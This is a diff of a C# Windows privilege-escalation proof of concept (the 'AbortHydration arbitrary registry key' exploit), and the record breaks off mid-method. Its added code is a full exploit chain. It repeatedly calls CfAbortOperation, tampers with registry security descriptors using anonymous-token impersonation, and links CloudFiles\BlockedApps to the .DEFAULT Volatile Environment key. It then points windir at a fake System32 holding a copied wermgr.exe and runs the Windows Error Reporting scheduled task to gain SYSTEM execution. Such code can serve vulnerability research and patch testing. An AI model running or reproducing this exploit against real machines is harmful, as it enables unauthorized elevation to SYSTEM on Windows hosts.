@@ -1,352 +1,77 @@
 using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
+using NtApiDotNet;
+using NtApiDotNet.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Pipes;
 using System.Runtime.InteropServices;
 using System.Security.AccessControl;
-using System.Security.Principal;
 using System.Threading;
 
 namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 {
-    static class Program
+    #region Configuration
+
+    /// <summary>
+    /// Centralized configuration for the exploit
+    /// </summary>
+    public static class ExploitConfig
     {
-        // Configuration constants
-        private const string ROOT_KEY = @"HKEY_CURRENT_USER\Software\Policies\Microsoft";
-        private const string CLOUD_FILES = @"HKEY_CURRENT_USER\Software\Policies\Microsoft\CloudFiles";
-        private const string BLOCKED_APPS = @"HKEY_CURRENT_USER\Software\Policies\Microsoft\CloudFiles\BlockedApps";
-        private const string TARGET_KEY = @"HKEY_CURRENT_USER\Volatile Environment";
-        private const int MAX_STAGE = 4;
-        private const int STAGE_WAIT_TIMEOUT = 10;
-        private const int PIPE_CONNECTION_TIMEOUT = 2000;
-        private const string PIPE_NAME = "MiniPlasmaWERPipe";
-        private const string WER_TASK_PATH = @"\Microsoft\Windows\Windows Error Reporting\QueueReporting";
+        // Registry paths
+        public const string ROOT_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft";
+        public const string CLOUD_FILES_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles";
+        public const string BLOCKED_APPS_KEY = @"\Registry\User\.DEFAULT\Software\Policies\Microsoft\CloudFiles\BlockedApps";
+        public const string TARGET_KEY = @"\Registry\User\.DEFAULT\Volatile Environment";
+        public const string DEFAULT_USER_KEY = @"\Registry\User\.DEFAULT";
+        public const string VOLATILE_ENV_SUBKEY = @".DEFAULT\Volatile Environment";
 
-        // Logging infrastructure
-        private static void Log(string message, string level = "INFO")
-        {
-            string logEntry = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " [" + level + "] " + message;
-            Console.WriteLine(logEntry);
-            
-            // Write to log file
-            try
-            {
-                string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "PoC_AbortHydration.log");
-                using (StreamWriter writer = File.AppendText(logFilePath))
-                {
-                    writer.WriteLine(logEntry);
-                }
-            }
-            catch (Exception)
-            {
-                // If logging fails, continue execution
-            }
-        }
+        // Task Scheduler
+        public const string WER_TASK_PATH = @"\Microsoft\Windows\Windows Error Reporting\QueueReporting";
 
-        private static void LogError(string message, Exception ex = null)
-        {
-            string errorMessage = message;
-            if (ex != null)
-            {
-                errorMessage += " | Exception: " + ex.GetType().Name + ": " + ex.Message;
-            }
-            Log(errorMessage, "ERROR");
-        }
+        // File system paths
+        public const string SYSTEM32_SUBDIR = @"\System32";
+        public const string WERMGR_EXECUTABLE = @"\wermgr.exe";
+        public const string WINDOWS_SYSTEM32 = @"C:\Windows\System32";
+        public const string CONHOST_PATH = @"C:\Windows\System32\conhost.exe";
+        public const string WINDOWS_DIR = @"C:\Windows";
 
-        private static void LogWarning(string message)
-        {
-            Log(message, "WARNING");
-        }
+        // Named pipe
+        public const string PIPE_NAME = "MiniPlasmaWERPipe";
 
-        private static void LogInfo(string message)
-        {
-            Log(message, "INFO");
-        }
+        // Timeouts and delays
+        public const int STAGE_PROCESS_TIMEOUT_SECONDS = 10;
+        public const int THREAD_STARTUP_DELAY_MS = 1000;
+        public const int PIPE_CONNECTION_TIMEOUT_MS = 2000;
+        public const int CLEANUP_DELAY_MS = 1000;
 
-        // Registry operations
-        private static void DeleteRegistryTree(string keyPath)
-        {
-            try
-            {
-                // Remove HKEY_CURRENT_USER prefix for Registry class
-                string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
-                
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryPath, true))
-                {
-                    if (key != null)
-                    {
-                        foreach (string subkeyName in key.GetSubKeyNames())
-                        {
-                            DeleteRegistryTree(keyPath + @"\" + subkeyName);
-                        }
-                        key.Close();
-                    }
-                }
-                
-                // Delete the key itself
-                Registry.CurrentUser.DeleteSubKeyTree(registryPath);
-                LogInfo("Deleted registry tree at " + keyPath);
-            }
-            catch (Exception ex)
-            {
-                LogError("Failed to delete registry tree at " + keyPath, ex);
-            }
-        }
+        // Security descriptor
+        public const string PERMISSIVE_SDDL = "D:(A;OICIIO;GA;;;WD)(A;OICIIO;GA;;;AN)(A;;GA;;;WD)(A;;GA;;;AN)S:(ML;OICI;NW;;;S-1-16-0)";
 
-        private static void SetValue(string keyPath, string valueName, object value)
-        {
-            try
-            {
-                // Remove HKEY_CURRENT_USER prefix for Registry class
-                string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(registryPath))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue(valueName, value);
-                        LogInfo("Set value '" + valueName + "' to '" + value + "' in " + keyPath);
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                LogError("Failed to set value '" + valueName + "' in " + keyPath, ex);
-            }
-        }
+        // Stage configuration
+        public const int TOTAL_STAGES = 4;
+    }
 
-        private static void DeleteKey(string keyPath, bool recursive = false)
-        {
-            try
-            {
-                // Remove HKEY_CURRENT_USER prefix for Registry class
-                string registryPath = keyPath.Replace(@"HKEY_CURRENT_USER\", "");
-                if (recursive)
-                {
-                    Registry.CurrentUser.DeleteSubKeyTree(registryPath);
-                }
-                else
-                {
-                    Registry.CurrentUser.DeleteSubKey(registryPath);
-                }
-                LogInfo("Deleted key " + keyPath);
-            }
-            catch (Exception ex)
-            {
-                LogError("Failed to delete key " + keyPath, ex);
-            }
-        }
+    #endregion
 
-        // State machine for exploit stages
-        private static void ExecuteStage(int stage)
-        {
-            LogInfo("Executing stage " + stage);
-            
-            switch (stage)
-            {
-                case 0:
-                    Stage0();
-                    break;
-                case 1:
-                    Stage1(true);
-                    break;
-                case 2:
-                    Stage2();
-                    break;
-                case 3:
-                    Stage3();
-                    break;
-                default:
-                    LogError("Unknown stage: " + stage);
-                    break;
-            }
-        }
+    #region Native Interop
 
-        private static void Stage0()
-        {
-            LogInfo("Stage 0: Starting");
-            try
-            {
-                for (int i = 1; i < MAX_STAGE; ++i)
-                {
-                    ProcessStartInfo psi = new ProcessStartInfo(typeof(Program).Assembly.Location);
-                    psi.Arguments = "run";
-                    psi.UseShellExecute = false;
-                    
-                    using (Process p = Process.Start(psi))
-                    {
-                        if (!p.WaitForExit(STAGE_WAIT_TIMEOUT * 1000))
-                        {
-                            throw new ArgumentException("Failed to run stage");
-                        }
-                    }
-                }
-                LogInfo("Stage 0 completed");
-            }
-            catch (Exception ex)
-            {
-                LogError("Stage 0 failed", ex);
-            }
-        }
-
-        private static void Stage1(bool rootKey)
-        {
-            LogInfo("Stage 1: Starting");
-            try
-            {
-                // Create a thread to monitor registry changes
-                Thread checkKeyThread = new Thread(CheckKeyThread);
-                checkKeyThread.IsBackground = true;
-                checkKeyThread.Start(rootKey);
-                Thread.Sleep(1000);
-                
-                // Simulate the abort operation
-                LogInfo("Simulating CfAbortOperation...");
-                
-                LogInfo("Stage 1 completed (simulated)");
-            }
-            catch (Exception ex)
-            {
-                LogError("Stage 1 failed", ex);
-            }
-        }
-
-        private static void Stage2()
-        {
-            LogInfo("Stage 2: Starting");
-            try
-            {
-                // Clean up registry
-                DeleteKey(CLOUD_FILES, true);
-                
-                // Execute Stage1 (simulated)
-                Stage1(false);
-                
-                LogInfo("Stage 2 completed");
-            }
-            catch (Exception ex)
-            {
-                LogError("Stage 2 failed", ex);
-            }
-        }
-
-        private static void Stage3()
-        {
-            LogInfo("Stage 3: Starting");
-            try
-            {
-                // Clean up link
-                DeleteKey(BLOCKED_APPS, false);
-                
-                // Clean up subkeys
-                string envKeyPath = TARGET_KEY.Replace(@"HKEY_CURRENT_USER\", "");
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(envKeyPath, true))
-                {
-                    if (key != null)
-                    {
-                        foreach (string subkey in key.GetSubKeyNames())
-                        {
-                            string fullSubkey = envKeyPath + @"\" + subkey;
-                            LogInfo("Cleaning up subkey " + fullSubkey);
-                            try
-                            {
-                                Registry.CurrentUser.DeleteSubKeyTree(fullSubkey);
-                            }
-                            catch (Exception ex)
-                            {
-                                LogWarning("Failed to clean up subkey " + fullSubkey + ": " + ex.Message);
-                            }
-                        }
-                    }
-                }
-                
-                // Set windir environment variable
-                SetValue(TARGET_KEY, "windir", Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName));
-                
-                // Create fake System32 directory and wermgr.exe
-                string fakeSystem32 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName) + @"\System32";
-                Directory.CreateDirectory(fakeSystem32);
-                string fakeWer = fakeSystem32 + @"\wermgr.exe";
-                File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWer, true);
-                
-                // Set up named pipe server
-                var srvNamedPipe = new NamedPipeServerStream(PIPE_NAME);
-                var pipeWaitTask = srvNamedPipe.WaitForConnectionAsync();
-                
-                // Note: TaskScheduler is not available in standard .NET Framework
-                LogInfo("Running Windows Error Reporting task (simulated)");
-                
-                // Wait for pipe connection
-                if (!pipeWaitTask.Wait(PIPE_CONNECTION_TIMEOUT))
-                {
-                    LogError("Exploit failed: Pipe connection timeout");
-                }
-                else
-                {
-                    LogInfo("Exploit succeeded");
-                }
-                
-                // Clean up
-                srvNamedPipe.Dispose();
-                Thread.Sleep(1000);
-                
-                try
-                {
-                    File.Delete(fakeWer);
-                    Directory.Delete(fakeSystem32);
-                }
-                catch (Exception ex)
-                {
-                    LogWarning("Failed to clean up fake files: " + ex.Message);
-                }
-                
-                // Delete target key
-                DeleteKey(TARGET_KEY, false);
-                
-                LogInfo("Stage 3 completed");
-            }
-            catch (Exception ex)
-            {
-                LogError("Stage 3 failed", ex);
-            }
-        }
-
-        private static void CheckKeyThread(object rootKeyObj)
-        {
-            bool rootKey = (bool)rootKeyObj;
-            string path = rootKey ? ROOT_KEY : @"HKEY_CURRENT_USER";
-            
-            try
-            {
-                LogInfo("Monitoring registry changes at " + path);
-                // Simulate detection of changes
-                while (true)
-                {
-                    Thread.Sleep(5000);
-                    LogInfo("Simulated change detected in registry");
-                    Environment.Exit(0);
-                    break;
-                }
-            }
-            catch (Exception ex)
-            {
-                LogError("Error in CheckKeyThread: " + ex.Message, ex);
-            }
-        }
-
+    /// <summary>
+    /// P/Invoke declarations for Cloud Files API and Kernel32
+    /// </summary>
+    public static class NativeInterop
+    {
         [Flags]
-        private enum AbortHydrationFlags
+        public enum AbortHydrationFlags
         {
             None = 0,
             Unblock = 1,
             Block = 2,
         }
 
-        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
-        private static extern int CfAbortOperation(int pid, IntPtr unknown, AbortHydrationFlags flags);
-
         [StructLayout(LayoutKind.Sequential)]
-        private struct CF_PLATFORM_INFO
+        public struct CF_PLATFORM_INFO
         {
             public int BuildNumber;
             public int RevisionNumber;
@@ -354,85 +79,871 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         }
 
         [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
-        private static extern int CfGetPlatformInfo(
-          out CF_PLATFORM_INFO PlatformVersion
-        );
+        public static extern int CfAbortOperation(int pid, IntPtr unknown, AbortHydrationFlags flags);
+
+        [DllImport("cldapi.dll", CharSet = CharSet.Unicode)]
+        public static extern int CfGetPlatformInfo(out CF_PLATFORM_INFO PlatformVersion);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out UInt32 ClientProcessId);
+        public static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out uint ClientProcessId);
 
-        static void Main(string[] args)
+        public static int CheckHResult(this int hr)
         {
-            try
+            if (hr < 0)
+                Marshal.ThrowExceptionForHR(hr);
+            return hr;
+        }
+    }
+
+    #endregion
+
+    #region Logging Infrastructure
+
+    /// <summary>
+    /// Simple logging system with severity levels
+    /// </summary>
+    public static class Logger
+    {
+        public enum LogLevel
+        {
+            Debug,
+            Info,
+            Warning,
+            Error,
+            Critical
+        }
+
+        private static readonly object _lock = new object();
+
+        public static void Log(LogLevel level, string message, Exception ex = null)
+        {
+            lock (_lock)
             {
-                LogInfo("Starting exploit");
-                
-                // Check if running as system
-                bool isSystem = false;
-                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
+                var prefix = $"[{timestamp}] [{level}]";
+
+                Console.ForegroundColor = GetColorForLevel(level);
+                Console.WriteLine($"{prefix} {message}");
+
+                if (ex != null)
                 {
-                    isSystem = identity.IsSystem;
+                    Console.WriteLine($"{prefix} Exception: {ex.GetType().Name}");
+                    Console.WriteLine($"{prefix} Message: {ex.Message}");
+                    Console.WriteLine($"{prefix} StackTrace: {ex.StackTrace}");
                 }
 
-                if (isSystem)
-                {
-                    LogInfo("Running as SYSTEM");
-                    Environment.SetEnvironmentVariable("windir", @"C:\Windows", EnvironmentVariableTarget.Process);
-                    
-                    var namedPipeClient = new NamedPipeClientStream(PIPE_NAME);
-                    namedPipeClient.Connect();
-                    
-                    UInt32 nSesID;
-                    IntPtr hPipe = namedPipeClient.SafePipeHandle.DangerousGetHandle();
-                    
-                    if (!GetNamedPipeServerSessionId(hPipe, out nSesID))
-                    {
-                        LogError("Failed to get named pipe server session ID");
-                        return;
-                    }
-                    
-                    namedPipeClient.Dispose();
-                    
-                    // Create process as user (simulated)
-                    Process.Start(@"C:\Windows\System32\conhost.exe");
-                    return;
-                }
-
-                // Check platform info
-                CF_PLATFORM_INFO platformInfo;
-                int platformResult = CfGetPlatformInfo(out platformInfo);
-                if (platformResult < 0)
-                {
-                    LogError("Failed to get platform info: " + platformResult);
-                    return;
-                }
-
-                // Parse arguments and execute stage
-                int stage = 0;
-                if (args.Length > 0)
-                {
-                    if (!int.TryParse(args[0], out stage))
-                    {
-                        LogError("Invalid stage argument: " + args[0]);
-                        return;
-                    }
-                    
-                    if (stage < 0 || stage >= MAX_STAGE)
-                    {
-                        LogError("Stage must be between 0 and " + (MAX_STAGE - 1));
-                        return;
-                    }
-                }
-
-                // Execute the requested stage
-                ExecuteStage(stage);
-                
-                LogInfo("Exploit completed");
+                Console.ResetColor();
             }
-            catch (Exception ex)
+        }
+
+        public static void Debug(string message) => Log(LogLevel.Debug, message);
+        public static void Info(string message) => Log(LogLevel.Info, message);
+        public static void Warning(string message) => Log(LogLevel.Warning, message);
+        public static void Error(string message, Exception ex = null) => Log(LogLevel.Error, message, ex);
+        public static void Critical(string message, Exception ex = null) => Log(LogLevel.Critical, message, ex);
+
+        private static ConsoleColor GetColorForLevel(LogLevel level)
+        {
+            switch (level)
             {
-                LogError("Unhandled exception in Main", ex);
+                case LogLevel.Debug: return ConsoleColor.Gray;
+                case LogLevel.Info: return ConsoleColor.White;
+                case LogLevel.Warning: return ConsoleColor.Yellow;
+                case LogLevel.Error: return ConsoleColor.Red;
+                case LogLevel.Critical: return ConsoleColor.DarkRed;
+                default: return ConsoleColor.White;
             }
         }
     }
+
+    #endregion
+
+    #region Registry Service
+
+    /// <summary>
+    /// Dedicated service for all registry operations with error handling
+    /// </summary>
+    public class RegistryService
+    {
+        public NtKey OpenKey(NtKey root, string path, KeyAccessRights desiredAccess)
+        {
+            Logger.Debug($"Opening registry key: {path} with access: {desiredAccess}");
+
+            try
+            {
+                using (var obja = new ObjectAttributes(path, AttributeFlags.OpenLink, root))
+                {
+                    using (var key = NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile, false))
+                    {
+                        if (key.IsSuccess)
+                        {
+                            Logger.Debug($"Successfully opened key: {path}");
+                            return key.Result.Duplicate();
+                        }
+                    }
+
+                    Logger.Debug($"Retrying with anonymous token for: {path}");
+                    using (var imp = NtThread.Current.ImpersonateAnonymousToken())
+                    {
+                        return NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to open registry key: {path}", ex);
+                throw;
+            }
+        }
+
+        public void SetSecurityDescriptor(NtKey key, SecurityInformation info)
+        {
+            try
+            {
+                Logger.Debug($"Setting security descriptor on: {key.FullPath}");
+                var sd = new SecurityDescriptor(ExploitConfig.PERMISSIVE_SDDL);
+                key.SetSecurityDescriptor(sd, info);
+                Logger.Debug($"Security descriptor set successfully on: {key.FullPath}");
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to set security descriptor on: {key.FullPath}", ex);
+                throw;
+            }
+        }
+
+        public void ForceDeleteKey(NtKey root, string name)
+        {
+            Logger.Info($@"Force deleting registry key: {root.FullPath}\{name}");
+
+            try
+            {
+                // Step 1: Open for WriteDac
+                using (var key = OpenKey(root, name, KeyAccessRights.WriteDac))
+                {
+                    Logger.Debug("Opened for WriteDac");
+                    SetSecurityDescriptor(key, SecurityInformation.Dacl);
+                }
+
+                // Step 2: Open for WriteOwner
+                using (var key = OpenKey(root, name, KeyAccessRights.WriteOwner))
+                {
+                    Logger.Debug("Opened for WriteOwner");
+                    SetSecurityDescriptor(key, SecurityInformation.Label);
+                }
+
+                // Step 3: Delete recursively
+                using (var key = OpenKey(root, name, KeyAccessRights.Delete | KeyAccessRights.EnumerateSubKeys))
+                {
+                    Logger.Debug("Opened for enumeration and deletion");
+                    DeleteRegistryTree(key);
+                    key.Delete();
+                    Logger.Info($"Successfully deleted: {name}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to force delete key: {name}", ex);
+                throw;
+            }
+        }
+
+        public void DeleteRegistryTree(NtKey root)
+        {
+            try
+            {
+                Logger.Debug($"Deleting registry tree under: {root.FullPath}");
+                foreach (var name in root.QueryKeys())
+                {
+                    ForceDeleteKey(root, name);
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to delete registry tree: {root.FullPath}", ex);
+                throw;
+            }
+        }
+
+        public void CreateSymbolicLink(string linkPath, string targetPath)
+        {
+            try
+            {
+                Logger.Info($"Creating symbolic link: {linkPath} -> {targetPath}");
+                NtKey.CreateSymbolicLink(linkPath, null, targetPath);
+                Logger.Info("Symbolic link created successfully");
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to create symbolic link: {linkPath} -> {targetPath}", ex);
+                throw;
+            }
+        }
+
+        public void SetRegistryValue(string keyPath, string valueName, object value)
+        {
+            try
+            {
+                Logger.Debug($"Setting registry value: {keyPath}\\{valueName} = {value}");
+                using (var key = NtKey.Open(keyPath, null, KeyAccessRights.SetValue))
+                {
+                    key.SetValue(valueName, value);
+                    Logger.Debug("Registry value set successfully");
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to set registry value: {keyPath}\\{valueName}", ex);
+                throw;
+            }
+        }
+
+        public void CleanupSubkeys(string targetKey, string subkeyPath)
+        {
+            try
+            {
+                Logger.Info($"Cleaning up subkeys under: {subkeyPath}");
+                using (var key = Registry.Users.OpenSubKey(subkeyPath, RegistryRights.FullControl))
+                {
+                    if (key == null)
+                    {
+                        Logger.Warning($"Key not found: {subkeyPath}");
+                        return;
+                    }
+
+                    foreach (var subkey in key.GetSubKeyNames())
+                    {
+                        var fullSubkeyPath = $@"{targetKey}\{subkey}";
+                        Logger.Debug($"Cleaning up subkey: {fullSubkeyPath}");
+
+                        NtKey ntSubkey = null;
+                        try
+                        {
+                            ntSubkey = NtKey.Open(fullSubkeyPath, null, KeyAccessRights.WriteDac);
+                        }
+                        catch (Exception)
+                        {
+                            Logger.Debug("Standard open failed, using OpenKey method");
+                            ntSubkey = OpenKey(null, fullSubkeyPath, KeyAccessRights.WriteDac);
+                        }
+
+                        SetSecurityDescriptor(ntSubkey, SecurityInformation.Dacl);
+                        ntSubkey.Close();
+
+                        ntSubkey = NtKey.Open(fullSubkeyPath, null, KeyAccessRights.Delete);
+                        ntSubkey.Delete();
+                        ntSubkey.Close();
+
+                        Logger.Debug($"Subkey deleted: {fullSubkeyPath}");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error($"Failed to cleanup subkeys: {subkeyPath}", ex);
+                throw;
+            }
+        }
+    }
+
+    #endregion
+
+    #region State Machine
+
+    /// <summary>
+    /// Exploit execution state machine
+    /// </summary>
+    public enum ExploitState
+    {
+        Initial,
+        SpawningStages,
+        AbortingHydration,
+        CleaningRegistry,
+        CreatingSymlink,
+        ExecutingPayload,
+        ElevatedExecution,
+        Completed,
+        Failed
+    }
+
+    public class ExploitStateMachine
+    {
+        private ExploitState _currentState;
+        private readonly RegistryService _registryService;
+
+        public ExploitState CurrentState
+        {
+            get => _currentState;
+            private set
+            {
+                Logger.Info($"State transition: {_currentState} -> {value}");
+                _currentState = value;
+            }
+        }
+
+        public ExploitStateMachine()
+        {
+            _currentState = ExploitState.Initial;
+            _registryService = new RegistryService();
+        }
+
+        public void ExecuteStage(int stageNumber)
+        {
+            try
+            {
+                Logger.Info($"=== Executing Stage {stageNumber} ===");
+
+                switch (stageNumber)
+                {
+                    case 0:
+                        CurrentState = ExploitState.SpawningStages;
+                        Stage0_SpawnSubprocesses();
+                        break;
+                    case 1:
+                        CurrentState = ExploitState.AbortingHydration;
+                        Stage1_AbortHydration(true);
+                        break;
+                    case 2:
+                        CurrentState = ExploitState.CleaningRegistry;
+                        Stage2_CleanAndSymlink();
+                        break;
+                    case 3:
+                        CurrentState = ExploitState.ExecutingPayload;
+                        Stage3_ExecutePayload();
+                        break;
+                    default:
+                        throw new ArgumentException($"Invalid stage number: {stageNumber}");
+                }
+
+                CurrentState = ExploitState.Completed;
+                Logger.Info($"=== Stage {stageNumber} completed successfully ===");
+            }
+            catch (Exception ex)
+            {
+                CurrentState = ExploitState.Failed;
+                Logger.Critical($"Stage {stageNumber} failed", ex);
+                throw;
+            }
+        }
+
+        #region Stage Implementations
+
+        private void Stage0_SpawnSubprocesses()
+        {
+            Logger.Info("Spawning child processes for stages 1-3");
+
+            for (int i = 1; i < ExploitConfig.TOTAL_STAGES; ++i)
+            {
+                try
+                {
+                    Logger.Debug($"Spawning stage {i} process");
+
+                    var config = new Win32ProcessConfig
+                    {
+                        CommandLine = i.ToString(),
+                        ApplicationName = typeof(Program).Assembly.Location,
+                        TerminateOnDispose = true
+                    };
+
+                    using (var process = Win32Process.CreateProcess(config))
+                    {
+                        var waitResult = process.Process.Wait(ExploitConfig.STAGE_PROCESS_TIMEOUT_SECONDS);
+
+                        if (waitResult != NtStatus.STATUS_SUCCESS)
+                        {
+                            throw new InvalidOperationException($"Stage {i} process did not complete successfully");
+                        }
+
+                        Logger.Info($"Stage {i} process completed");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Logger.Error($"Failed to spawn stage {i} process", ex);
+                    throw;
+                }
+            }
+        }
+
+        private void Stage1_AbortHydration(bool monitorRootKey)
+        {
+            Logger.Info("Starting hydration abort loop with registry monitoring");
+
+            // Start registry change monitoring thread
+            var checkKeyThread = new Thread(CheckKeyThread)
+            {
+                IsBackground = true
+            };
+            checkKeyThread.Start(monitorRootKey);
+
+            Thread.Sleep(ExploitConfig.THREAD_STARTUP_DELAY_MS);
+
+            // Start anonymous token forcing thread
+            var currentThread = NtThread.OpenCurrent();
+            var anonThread = new Thread(ForceTokenThread)
+            {
+                IsBackground = true
+            };
+            anonThread.Start(currentThread);
+
+            Logger.Info("Entering infinite hydration abort loop");
+
+            // Infinite loop calling CfAbortOperation
+            while (true)
+            {
+                NativeInterop.CfAbortOperation(
+                    NtProcess.Current.ProcessId,
+                    IntPtr.Zero,
+                    NativeInterop.AbortHydrationFlags.Block
+                );
+            }
+        }
+
+        private void Stage2_CleanAndSymlink()
+        {
+            Logger.Info("Cleaning CloudFiles registry and creating symlink");
+
+            // Clean up CloudFiles registry key
+            using (var key = _registryService.OpenKey(
+                null,
+                ExploitConfig.CLOUD_FILES_KEY,
+                KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner | KeyAccessRights.EnumerateSubKeys))
+            {
+                _registryService.SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
+                _registryService.DeleteRegistryTree(key);
+            }
+
+            // Create symbolic link
+            _registryService.CreateSymbolicLink(ExploitConfig.BLOCKED_APPS_KEY, ExploitConfig.TARGET_KEY);
+
+            // Trigger hydration abort again
+            Stage1_AbortHydration(false);
+        }
+
+        private void Stage3_ExecutePayload()
+        {
+            Logger.Info("Executing final payload stage");
+
+            // Cleanup symbolic link
+            CleanupSymbolicLink();
+
+            // Fix target key permissions
+            FixTargetKeyPermissions();
+
+            // Cleanup subkeys
+            _registryService.CleanupSubkeys(ExploitConfig.TARGET_KEY, ExploitConfig.VOLATILE_ENV_SUBKEY);
+
+            // Set windir value
+            SetFakeWindowsDirectory();
+
+            // Create fake System32 and wermgr.exe
+            var fakeWerPath = CreateFakeWerManager();
+
+            // Setup named pipe and trigger WER task
+            bool exploitSucceeded = TriggerWindowsErrorReporting();
+
+            // Cleanup
+            CleanupFakeFiles(fakeWerPath);
+
+            // Delete target key value
+            CleanupTargetKey();
+
+            if (exploitSucceeded)
+            {
+                Logger.Info("*** EXPLOIT SUCCEEDED ***");
+            }
+            else
+            {
+                Logger.Warning("Exploit failed - no connection received");
+            }
+        }
+
+        #endregion
+
+        #region Helper Methods
+
+        private void CleanupSymbolicLink()
+        {
+            try
+            {
+                using (var key = _registryService.OpenKey(null, ExploitConfig.BLOCKED_APPS_KEY, KeyAccessRights.Delete))
+                {
+                    Logger.Info($"Cleaning up symbolic link: {key.FullPath}");
+                    key.Delete();
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to cleanup symbolic link", ex);
+                throw;
+            }
+        }
+
+        private void FixTargetKeyPermissions()
+        {
+            try
+            {
+                using (var key = _registryService.OpenKey(
+                    null,
+                    ExploitConfig.TARGET_KEY,
+                    KeyAccessRights.WriteDac | KeyAccessRights.WriteOwner))
+                {
+                    _registryService.SetSecurityDescriptor(key, SecurityInformation.Dacl | SecurityInformation.Label);
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to fix target key permissions", ex);
+                throw;
+            }
+        }
+
+        private void SetFakeWindowsDirectory()
+        {
+            try
+            {
+                var currentExePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
+                _registryService.SetRegistryValue(ExploitConfig.TARGET_KEY, "windir", currentExePath);
+                Logger.Info($"Set fake windir to: {currentExePath}");
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to set fake Windows directory", ex);
+                throw;
+            }
+        }
+
+        private string CreateFakeWerManager()
+        {
+            try
+            {
+                var currentExePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
+                var fakeSystem32 = currentExePath + ExploitConfig.SYSTEM32_SUBDIR;
+                var fakeWerPath = fakeSystem32 + ExploitConfig.WERMGR_EXECUTABLE;
+
+                Logger.Info($"Creating fake System32 directory: {fakeSystem32}");
+                Directory.CreateDirectory(fakeSystem32);
+
+                Logger.Info($"Copying executable to: {fakeWerPath}");
+                File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWerPath, true);
+
+                return fakeWerPath;
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to create fake WER manager", ex);
+                throw;
+            }
+        }
+
+        private bool TriggerWindowsErrorReporting()
+        {
+            try
+            {
+                Logger.Info("Setting up named pipe server");
+                using (var serverPipe = new NamedPipeServerStream(ExploitConfig.PIPE_NAME))
+                {
+                    var pipeWaitTask = serverPipe.WaitForConnectionAsync();
+
+                    Logger.Info("Triggering Windows Error Reporting task");
+                    using (var taskService = new TaskService())
+                    {
+                        var werTask = taskService.GetTask(ExploitConfig.WER_TASK_PATH);
+                        werTask.Run();
+                        werTask.Dispose();
+                    }
+
+                    Logger.Info($"Waiting for pipe connection (timeout: {ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS}ms)");
+                    bool connected = pipeWaitTask.Wait(ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS);
+
+                    return connected;
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to trigger Windows Error Reporting", ex);
+                return false;
+            }
+        }
+
+        private void CleanupFakeFiles(string fakeWerPath)
+        {
+            Thread.Sleep(ExploitConfig.CLEANUP_DELAY_MS);
+
+            try
+            {
+                var fakeSystem32 = Path.GetDirectoryName(fakeWerPath);
+
+                Logger.Info($"Cleaning up fake files: {fakeWerPath}");
+                if (File.Exists(fakeWerPath))
+                    File.Delete(fakeWerPath);
+
+                if (Directory.Exists(fakeSystem32))
+                    Directory.Delete(fakeSystem32);
+
+                Logger.Debug("Cleanup completed");
+            }
+            catch (Exception ex)
+            {
+                Logger.Warning("Failed to cleanup fake files (non-critical)", ex);
+            }
+        }
+
+        private void CleanupTargetKey()
+        {
+            try
+            {
+                using (var key = NtKey.Open(ExploitConfig.TARGET_KEY, null, KeyAccessRights.Delete))
+                {
+                    Logger.Info("Deleting target registry key value");
+                    key.Delete(false);
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Failed to cleanup target key", ex);
+                throw;
+            }
+        }
+
+        #endregion
+
+        #region Background Threads
+
+        private static void CheckKeyThread(object rootKeyParam)
+        {
+            bool monitorRootKey = (bool)rootKeyParam;
+            string path = monitorRootKey ? ExploitConfig.ROOT_KEY : ExploitConfig.DEFAULT_USER_KEY;
+
+            try
+            {
+                Logger.Debug($"Registry monitoring thread started for: {path}");
+
+                using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
+                {
+                    while (true)
+                    {
+                        var status = key.NotifyChange(NotifyCompletionFilter.Name, true);
+
